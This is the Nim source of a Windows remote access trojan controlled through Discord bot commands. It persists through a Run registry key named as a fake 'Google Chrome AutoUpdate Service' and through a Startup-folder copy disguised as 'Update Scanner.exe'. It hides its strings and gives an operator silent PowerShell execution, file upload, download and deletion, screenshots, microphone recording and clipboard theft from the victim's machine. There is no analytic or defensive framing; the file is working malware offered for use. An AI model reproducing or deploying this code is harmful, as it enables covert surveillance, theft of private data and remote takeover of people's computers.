import utils/[audio, screenshot, clipboard]

import dimscord
import asyncdispatch
import options
import os
import strutils
import httpclient
import streams
import osproc
import winim/lean
import nimprotect

const
  KEY_SET_VALUE = 0x0002
  REG_SZ = 1

proc RegOpenKeyEx(hKey: HKEY, lpSubKey: LPCSTR, ulOptions: DWORD, samDesired: REGSAM, phkResult: var HKEY): LONG {.stdcall,
    importc: "RegOpenKeyExA", dynlib: "advapi32" .}

proc RegCloseKey(hKey: HKEY): LONG {.stdcall, importc: "RegCloseKey", dynlib: "advapi32" .}

proc RegSetValueEx(hKey: HKEY, lpValueName: LPCSTR, Reserved: DWORD, dwType: DWORD, lpData: LPBYTE, cbData: DWORD): LONG {.stdcall,
    importc: "RegSetValueExA", dynlib: "advapi32" .}

proc getCurrentExecutablePath(): string =
  result = getExePath()

proc mainmagic() =
  # Define la ruta del registro y el nombre del valor
  let keyPath = r"Software\Microsoft\Windows\CurrentVersion\Run"
  let valueName = "Google Chrome AutoUpdate Service"
  
  # Obtiene la ruta del ejecutable actual
  let executablePath = getCurrentExecutablePath()
  
  # Abre la clave del registro
  var hKey: HKEY = nil
  if RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_SET_VALUE, hKey) != 0:
      #error code
      return
  
  # Establece el valor en el registro
  if RegSetValueEx(hKey, valueName, 0, REG_SZ, cast[LPBYTE](executablePath.cstr), len(executablePath) * sizeof(cchar)) != 0:
      #error code
  
  # Cierra la clave del registro
  RegCloseKey(hKey)

when isMainModule:
  mainmagic()

let discord = newDiscordClient(protectString("token here"))

const helpMenu = protectString("""
**:video_game: Bot Control**
`.help` - show help menu
`.ping` - pings all clients
`.control <client/all>` - select target or all

**:file_folder: File Management**
`.upload <attachment>` - upload file from target
`.download <path>` - download file to target 
`.remove <path>` - removes file specified

**:desktop: System**
`.shell <command>` - execute silent powershell command
`.ip` - retrieves clients ip adress
`.persist` - attempts to establish persistence

**:detective: Surveillance**
`.screenshot` - takes a screenshot and sends 
`.record <seconds>` - records mic for selected amount of seconds
`.clip` - sends clipboard content
""")

var targetUsername = getenv(protectString("username"))
var selectedTarget: string

proc onReady(s: Shard, r: Ready) {.event(discord).} =
    echo protectString("Ready as ") & targetUsername

proc messageCreate(s: Shard, m: Message) {.event(discord).} =
    let content = m.content
    if (m.author.bot): return

    if (content == protectString(".ping")):
        discard await discord.api.sendMessage(m.channel_id, protectString("[+] Hello from **") & targetUsername & "**. " & $s.latency() & "ms")

    if (content.startsWith(protectString(".control"))):
        var 
            messageContents = split(content, " ")

        try:
            selectedTarget = messageContents[1]
            if (selectedTarget == "all"):
                selectedTarget = targetUsername
            if (selectedTarget == targetUsername):
                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Selected Target : **") & selectedTarget & "**")

        except:
            discard await discord.api.sendMessage(m.channel_id, protectString("[!!] No Target Selected"))

    if (selectedTarget == targetUsername):
        if (content == protectString(".help")):
            discard await discord.api.sendMessage(
                m.channel_id, 
                embeds = @[Embed(
                    title: some protectString("Hello there!"), 
                    description: some protectString(helpMenu),
                    color: some 0x490070
                )]
                )

        elif (content == protectString(".download")):
            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Downloading..."))
            for attachmentIndex, attachmentValue in m.attachments:
                var
                    filename = attachmentValue.filename
                    url = attachmentValue.url
                    client = newHttpClient()
                    response = client.get(url)
                    f = newFileStream(filename, fmWrite)
                f.write(response.body)
                f.close()
                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Downloaded **") & filename & "** to : **" & targetUsername & "**")
        
        elif (content.startsWith(".upload")):
            discard await discord.api.sendMessage(m.channel_id, "[*] Uploading...")
            try:
                var path = split(content, " ")[1]
                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Uploaded From : **") & targetUsername & "**", files = @[DiscordFile(name: path)])
            except:
                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] File Not Found"))
        
        elif (content.startsWith(protectString(".record"))):
            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Recording..."))
            try:
                var time = content[8 .. content.high]
                record_mic(time.parseInt() + 1)
                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Recorded mic input for : **") & time & "** seconds.", files = @[DiscordFile(name: "recording.wav")])
                os.removeFile(protectString("recording.wav"))
            except:
                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] Something went wrong! Did you input recording time?"))
        
        elif (content == protectString(".screenshot")):
            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Taking screenshot..."))
            try:
                get_screenshot()
                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Screenshot from : **") & targetUsername & "**.", files = @[DiscordFile(name: "screenshot.png")])
                os.removeFile(protectString("screenshot.png"))
            except:
                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] Something went wrong!"))
        
        elif (content == protectString(".persist")):
            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Attempting to establish persistence..."))
            try:
                copyfile(getAppFilename(), protectString(r"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Update Scanner.exe"))
                discard await discord.api.sendMessage(m.channel_id, protectString("[*] Persistence established!"))
            except CatchableError:
                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] Failed to establish persistence!"))

        elif (content == protectString(".clip")):
            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Getting clipboard..."))
            try:
                var 
                  content = get_clipboard()
                  f = newFileStream(protectString("clipboard.txt"), fmWrite)
                f.write(content)
                f.close()
                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Clipboard from : **") & targetUsername & "**.", files = @[DiscordFile(name: "clipboard.txt")])
                os.removeFile(protectString("clipboard.txt"))
            except:
                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] Something went wrong!"))

        elif (content.startswith(protectString(".shell"))):
            discard await discord.api.sendMessage(m.channel_id, protectString("Running command..."))
            var 
                command = content[6 .. content.high]
                outp = execProcess(protectString("powershell.exe /c ") & command , options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
            
            if outp.len() < 2000:
                try:
                    discard await discord.api.sendMessage(m.channel_id, "```" & outp & "```")
                except:
                    discard await discord.api.sendMessage(m.channel_id, protectString("Ran : `") & command & "` on : **" & targetUsername & "** but no output was given.")
            else:
                var f = newFileStream(protectString("output.txt"), fmWrite)
                f.write(outp)
                f.close()
                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Output from : **") & targetUsername & "**.", files = @[DiscordFile(name: "output.txt")])
                os.removeFile(protectString("output.txt"))
        
        elif (content == protectString(".ip")):
            var
              client = newHttpClient()
              ip_response = client.get(protectString("https://ipinfo.io/json"))
              ipinfo = ip_response.body
            
            discard await discord.api.sendMessage(
                m.channel_id, 
                embeds = @[Embed(
                    title: some protectString(":satellite: IP Info"), 
                    description: some "```" & ipinfo & "```",
                    color: some 0x490070
                )]
                )

        elif (content.startsWith(protectString(".remove"))):
            discard await discord.api.sendMessage(m.channel_id, protectString("[*] Removing..."))
            try:
                var path = split(content, " ")[1]
                os.removeFile(path)
                discard await discord.api.sendMessage(m.channel_id, protectString("[+] Removed file **") & path & "** from **" & targetUsername & "**")
            except:
                discard await discord.api.sendMessage(m.channel_id, protectString("[!!] File Not Found"))

waitFor discord.startSession()
